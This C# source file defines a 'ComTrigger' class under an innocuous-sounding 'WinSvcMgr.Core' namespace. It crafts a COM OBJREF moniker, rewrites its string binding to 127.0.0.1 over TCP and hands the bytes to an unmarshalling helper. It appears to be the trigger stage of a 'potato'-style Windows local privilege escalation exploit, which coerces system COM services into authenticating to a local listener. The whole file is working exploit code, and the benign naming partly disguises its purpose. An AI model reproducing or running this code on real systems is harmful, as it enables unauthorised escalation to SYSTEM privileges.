using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace WinSvcMgr.Core
{
    [ComVisible(true)]
    public class ComTrigger
    {
        private readonly static Guid IID_IUnknown = new Guid("{00000000-0000-0000-C000-000000000046}");
        private readonly static string binding = "127.0.0.1";
        private readonly static TowerProtocol towerProtocol = TowerProtocol.EPM_PROTOCOL_TCP;

        public object fakeObject = new object();
        public IntPtr pIUnknown;
        public IBindCtx bindCtx;
        public IMoniker moniker;

        private ServiceContext ctx;

        public ComTrigger(ServiceContext ctx)
        {
            this.ctx = ctx;

            if (!ctx.IsStart)
                throw new Exception("Context not initialized");

            pIUnknown = Marshal.GetIUnknownForObject(fakeObject);
            WinApi.CreateBindCtx(0, out bindCtx);
            WinApi.CreateObjrefMoniker(pIUnknown, out moniker);
        }

        public int Trigger()
        {
            string ppszDisplayName;
            moniker.GetDisplayName(bindCtx, null, out ppszDisplayName);
            ppszDisplayName = ppszDisplayName.Replace("objref:", "").Replace(":", "");
            byte[] objrefBytes = Convert.FromBase64String(ppszDisplayName);

            ObjRef tmpObjRef = new ObjRef(objrefBytes);

            ctx.ConsoleWriter.WriteLine($"[*] GUID: {tmpObjRef.Guid}");
            ctx.ConsoleWriter.WriteLine($"[*] IPID: {tmpObjRef.StandardObjRef.IPID}");
            ctx.ConsoleWriter.WriteLine("[*] OXID: 0x{0:x}", tmpObjRef.StandardObjRef.OXID);
            ctx.ConsoleWriter.WriteLine("[*] OID: 0x{0:x}", tmpObjRef.StandardObjRef.OID);
            ctx.ConsoleWriter.WriteLine("[*] Flags: 0x{0:x}", tmpObjRef.StandardObjRef.Flags);
            ctx.ConsoleWriter.WriteLine("[*] Refs: 0x{0:x}", tmpObjRef.StandardObjRef.PublicRefs);

            ObjRef objRef = new ObjRef(IID_IUnknown,
                  new ObjRef.Standard(0, 1, tmpObjRef.StandardObjRef.OXID, tmpObjRef.StandardObjRef.OID, tmpObjRef.StandardObjRef.IPID,
                    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));
            byte[] data = objRef.GetBytes();

            ctx.ConsoleWriter.WriteLine($"[*] Data len: {data.Length}");

            IntPtr ppv;
            ctx.ConsoleWriter.WriteLine($"[*] Processing");
            return ComHelper.Process(data, out ppv);
        }
    }
}
